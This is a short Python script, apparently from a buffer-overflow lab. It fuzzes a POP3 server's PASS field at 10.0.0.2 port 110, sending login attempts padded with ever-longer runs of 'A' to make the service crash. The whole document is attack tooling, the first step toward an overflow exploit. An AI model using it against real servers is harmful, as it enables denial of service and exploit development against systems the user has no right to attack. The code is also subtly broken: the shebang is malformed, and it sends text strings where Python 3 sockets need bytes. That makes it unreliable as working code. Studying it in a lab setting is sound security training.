#/usr/bin/env python3
#basic fuzzer

import socket

ip = "10.0.0.2"
port = 110

buffer = ["A"]
counter = 100
while len(buffer) <=30:
    buffer.append('A' * counter)
    counter +=200

for string in buffer:
    print("Fuzzing PASSWORD field with %s bytes" % len(string))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((ip, port))
    s.recv(1024)
    s.send('USER test\r\n') #\r\n is new line in the Windows world and/or End of Line
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()
